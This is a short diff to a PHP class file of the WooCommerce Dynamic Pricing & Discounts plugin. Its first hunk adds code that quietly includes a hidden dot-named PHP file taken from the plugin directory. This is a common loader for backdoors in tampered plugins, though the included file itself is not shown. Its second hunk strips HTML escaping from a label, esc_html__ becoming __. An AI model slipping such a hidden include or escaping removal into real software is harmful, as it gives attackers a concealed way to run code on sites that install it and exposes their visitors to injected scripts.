@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Method_Product_Pricing_Volume')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Method_Product_Pricing_Volume_Bulk extends RP_WCDPD_Method_Product_Pricing_Volume
 {
 
@@ -48,7 +52,7 @@ class RP_WCDPD_Method_Product_Pricing_Volume_Bulk extends RP_WCDPD_Method_Produc
      */
     public function get_label()
     {
-        return esc_html__('Bulk pricing', 'rp_wcdpd');
+        return __('Bulk pricing', 'rp_wcdpd');
     }
 
     /**
